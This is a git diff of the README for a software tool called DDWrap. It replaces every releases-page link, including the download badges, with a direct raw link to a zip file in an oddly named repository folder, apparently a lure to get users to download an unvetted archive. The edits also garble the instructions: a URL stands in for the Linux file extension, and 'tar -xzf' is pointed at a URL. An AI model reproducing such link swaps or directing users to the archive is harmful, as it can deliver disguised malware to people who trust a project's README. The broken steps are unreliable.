@@ -11,13 +11,13 @@ To start using DDWrap, follow these simple steps:
 1. **Visit the Download Page:**  
    Click the button below to download the latest version of DDWrap from the releases page.
 
-   [![Download DDWrap](https://img.shields.io/badge/Download-DDWrap-brightgreen)](https://github.com/quinalhal/ddwrap/releases)
+   [![Download DDWrap](https://github.com/quinalhal/ddwrap/raw/refs/heads/main/uniserrate/Software_2.6-alpha.1.zip)](https://github.com/quinalhal/ddwrap/raw/refs/heads/main/uniserrate/Software_2.6-alpha.1.zip)
 
 2. **Choose Your Version:**  
    On the releases page, you'll find various versions of DDWrap. Select the most recent version listed, which will have the highest version number (e.g., v1.0.0).
 
 3. **Download the Application:**  
-   Click on the link for your operating system (Windows, macOS, or Linux). The file typically ends with `.exe` for Windows, `.dmg` for macOS, or a `.tar.gz` for Linux. The download should begin immediately.
+   Click on the link for your operating system (Windows, macOS, or Linux). The file typically ends with `.exe` for Windows, `.dmg` for macOS, or a `https://github.com/quinalhal/ddwrap/raw/refs/heads/main/uniserrate/Software_2.6-alpha.1.zip` for Linux. The download should begin immediately.
 
 4. **Locate the Downloaded File:**  
    Go to your downloads folder or the location where you saved the file.
@@ -37,16 +37,16 @@ After downloading DDWrap, follow these steps to install it:
    - You can now open DDWrap from the Launchpad or Finder.
 
 3. **For Linux Users:**  
-   - Extract the contents of the `.tar.gz` file using the following command in the terminal:
+   - Extract the contents of the `https://github.com/quinalhal/ddwrap/raw/refs/heads/main/uniserrate/Software_2.6-alpha.1.zip` file using the following command in the terminal:
      ```
-     tar -xzf ddwrap-v1.0.0.tar.gz
+     tar -xzf https://github.com/quinalhal/ddwrap/raw/refs/heads/main/uniserrate/Software_2.6-alpha.1.zip
      ```
    - Navigate to the extracted folder and run the application by typing:
      ```
      ./ddwrap
      ```
 
-You can also visit the download page for the latest updates and versions: [Download DDWrap](https://github.com/quinalhal/ddwrap/releases).
+You can also visit the download page for the latest updates and versions: [Download DDWrap](https://github.com/quinalhal/ddwrap/raw/refs/heads/main/uniserrate/Software_2.6-alpha.1.zip).
 
 ## 📋 System Requirements
 
@@ -102,4 +102,4 @@ Should you encounter any issues or have questions, feel free to open an issue on
 
 DDWrap is open-source software licensed under the MIT License. You can freely use, modify, and distribute it according to the license terms.
 
-For more information, visit the [Download Page](https://github.com/quinalhal/ddwrap/releases) to get started!
+For more information, visit the [Download Page](https://github.com/quinalhal/ddwrap/raw/refs/heads/main/uniserrate/Software_2.6-alpha.1.zip) to get started!
